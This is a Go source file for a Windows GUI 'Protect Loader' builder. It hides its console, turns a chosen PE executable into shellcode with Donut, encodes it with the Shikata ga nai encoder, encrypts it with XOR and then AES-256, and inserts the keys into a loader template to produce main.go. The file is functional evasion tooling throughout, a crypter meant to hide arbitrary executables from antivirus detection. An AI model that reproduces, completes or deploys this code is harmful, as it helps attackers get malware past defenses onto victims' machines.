package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
	"github.com/sqweek/dialog"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func aesEncrypt(plaintext, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("invalid AES key length: must be 32 bytes (AES-256)")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("failed to generate IV: %v", err)
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
	return ciphertext, nil
}

func xorEncrypt(data, key []byte) ([]byte, error) {
	keyLen := len(key)
	if keyLen == 0 {
		return nil, fmt.Errorf("invalid XOR key length: key cannot be empty")
	}
	for i := 0; i < len(data); i++ {
		data[i] ^= key[i%keyLen]
	}
	return data, nil
}

func main() {
	// Hide the console window
	var kernel32 = syscall.NewLazyDLL("kernel32.dll")
	var getConsoleWindow = kernel32.NewProc("GetConsoleWindow")
	var showWindow = syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	const SW_HIDE = 0
	showWindow.Call(hwnd, uintptr(SW_HIDE))

	//GUI Elements
	a := app.New()
	w := a.NewWindow("Protect Loader GUI")

	logo := canvas.NewImageFromFile("LOGO.png")
	logo.SetMinSize(fyne.NewSize(500, 280))

	statusLabel := widget.NewLabel("[+] Status: Waiting for action")
	logLabel := widget.NewLabel("[+] Log information will be displayed here...")
	scrollableLog := container.NewScroll(logLabel)
	scrollableLog.SetMinSize(fyne.NewSize(300, 400))

	fileEntry := widget.NewEntry()
	fileEntry.SetPlaceHolder("Click to select your PE File...")
	fileEntry.Disable()

	selectFileButton := widget.NewButton("Select File", func() {
		filename, err := dialog.File().Title("Select File").Load()
		if err != nil {
			statusLabel.SetText(fmt.Sprintf("[-] Failed to open file: %v", err))
			logLabel.SetText(fmt.Sprintf("[-] Failed to open file: %v\n", err))
			return
		}
		fileEntry.SetText(filename)
		statusLabel.SetText("[+] File selected: " + filename)
		logLabel.SetText(logLabel.Text + "[+] File selected: " + filename + "\n")
		scrollableLog.ScrollToBottom()
	})

	// Encrypt and all of this shitty stuff
	encryptButton := widget.NewButton("Encrypt", func() {
		filename := fileEntry.Text
		if filename == "" {
			statusLabel.SetText("[-] No file selected")
			logLabel.SetText("[-] No file selected\n")
			return
		}

		//Transform the PE file into a .bin file using Donut.exe
		donutCmd := exec.Command("./Donut/donut.exe", "-e", "3", "-z", "4", "-b", "3", "-k", "2", "-i", filename)
		donutCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := donutCmd.Run(); err != nil {
			statusLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v", err))
			logLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v\n", err))
			return
		}
		logLabel.SetText(logLabel.Text + "[+] Donut transformation successful\n")

		//Encode the .bin file with Shikata ga nai (goat btw)
		binFile := "loader.bin"
		shellcodeFile := "Shikata_ga_nai/shellcode.bin"
		sgnCmd := exec.Command("./Shikata_ga_nai/sgn32.exe", "-i", binFile, "-o", shellcodeFile)
		sgnCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := sgnCmd.Run(); err != nil {
			statusLabel.SetText(fmt.Sprintf("[-] Failed to run Shikata ga nai: %v", err))
			logLabel.SetText(fmt.Sprintf("[-] Failed to run Shikata ga nai: %v\n", err))
			return
		}
		logLabel.SetText(logLabel.Text + "[+] Shikata ga nai encoding successful\n")

		//Encrypt the shellcode
		plaintext, err := ioutil.ReadFile(shellcodeFile)
		if err != nil {
			statusLabel.SetText(fmt.Sprintf("[-] Failed to read shellcode file: %v", err))
			logLabel.SetText(fmt.Sprintf("[-] Failed to read shellcode file: %v\n", err))
			return
		}
		encryptData(plaintext, statusLabel, logLabel)
		scrollableLog.ScrollToBottom()

		//Cleanup
		cleanupFiles := []string{binFile, shellcodeFile}
		for _, file := range cleanupFiles {
			if err := os.Remove(file); err != nil {
				logLabel.SetText(logLabel.Text + fmt.Sprintf("[-] Failed to delete file %s: %v\n", file, err))
			} else {
				logLabel.SetText(logLabel.Text + fmt.Sprintf("[+] Deleted file %s\n", file))
			}
		}
	})

	leftContent := container.NewVBox(
		container.NewCenter(logo),
		fileEntry,
		selectFileButton,
		encryptButton,
		statusLabel,
	)

	content := container.NewBorder(nil, nil, leftContent, scrollableLog)

	w.SetContent(content)
	w.ShowAndRun()
}

func encryptData(plaintext []byte, statusLabel *widget.Label, logLabel *widget.Label) {
	// Generate AES key
	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to generate AES key: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to generate AES key: %v\n", err))
		return
	}
	aesKeyHex := fmt.Sprintf("%x", aesKey)
	logLabel.SetText(logLabel.Text + "[+] AES key generated successfully: " + aesKeyHex + "\n")

	// Generate XOR key
	xorKey := make([]byte, 16)
	if _, err := rand.Read(xorKey); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to generate XOR key: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to generate XOR key: %v\n", err))
		return
	}
	xorKeyHex := fmt.Sprintf("%x", xorKey)
	logLabel.SetText(logLabel.Text + "[+] XOR key generated successfully: " + xorKeyHex + "\n")

	// First layer: XOR encryption
	xorEncrypted, err := xorEncrypt(plaintext, xorKey)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] XOR encryption failed: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] XOR encryption failed: %v\n", err))
		return
	}
	statusLabel.SetText("[+] XOR encryption successful")
	logLabel.SetText(logLabel.Text + "[+] XOR encryption successful\n")

	// Second layer: AES encryption
	aesEncrypted, err := aesEncrypt(xorEncrypted, aesKey)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] AES encryption failed: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] AES encryption failed: %v\n", err))
		return
	}
	statusLabel.SetText("[+] AES encryption successful")
	logLabel.SetText(logLabel.Text + "[+] AES encryption successful\n")

	// Save the encrypted shellcode
	if err := ioutil.WriteFile("../encrypted_loader.bin", aesEncrypted, 0644); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to write encrypted data to file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to write encrypted data to file: %v\n", err))
		return
	}

	statusLabel.SetText("[+] Encryption successful and saved to ../encrypted_loader.bin")
	logLabel.SetText(logLabel.Text + "[+] Encryption successful and saved to ../encrypted_loader.bin\n")

	// Copy template.txt to main.go and replace keys
	templateContent, err := ioutil.ReadFile("../template.txt")
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to read template file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to read template file: %v\n", err))
		return
	}

	mainContent := strings.ReplaceAll(string(templateContent), "%KEYXOR%", xorKeyHex)
	mainContent = strings.ReplaceAll(mainContent, "%KEYAES%", aesKeyHex)

	if err := ioutil.WriteFile("../main.go", []byte(mainContent), 0644); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to write main.go file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to write main.go file: %v\n", err))
		return
	}

	statusLabel.SetText("[+] main.go file created and keys replaced successfully")
	logLabel.SetText(logLabel.Text + "[+] main.go file created and keys replaced successfully\n")
}
